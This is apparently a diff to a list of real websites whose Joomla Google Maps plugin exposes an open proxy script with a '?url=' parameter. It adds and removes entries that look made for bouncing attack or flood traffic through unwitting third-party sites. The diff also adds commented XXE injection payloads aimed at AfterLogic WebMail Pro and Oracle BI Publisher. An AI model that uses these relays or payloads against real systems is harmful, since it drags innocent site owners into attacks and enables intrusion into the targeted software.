@@ -34,7 +34,6 @@ http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=
 http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=
-http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=
@@ -51,11 +50,9 @@ http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url
 http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.bergenpol.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.arantzabelaikastola.com/webgunea/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt
@@ -68,7 +65,6 @@ http://translate.yandex.net/tr-url/ru-uk.uk/
 http://es.laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=
-http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=
 http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=
@@ -85,7 +81,6 @@ http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=
 http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
-http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
@@ -167,3 +162,7 @@ http://dacd.win/b.php?b=4&u=
 http://www.ecocenter-vg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
 http://econom.govvrn.ru/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.sandp.co.th/plugins/system/plugin_googlemap2_proxy.php?url=
+# XXE Injection in AfterLogic WebMail Pro
+# http://site/webmail/spellcheck.aspx?xml=<?xml+version="1.0"+encoding="utf-8"?>%0a<!DOCTYPE+x+[%0a<!ENTITY+%25+xxe+SYSTEM+"http://site">%0a%25xxe%3b]>
+# XXE Injection in Oracle BI Publisher
+# http://site/xmlpserver/services/ServiceGateway;XML;Oracle.txt
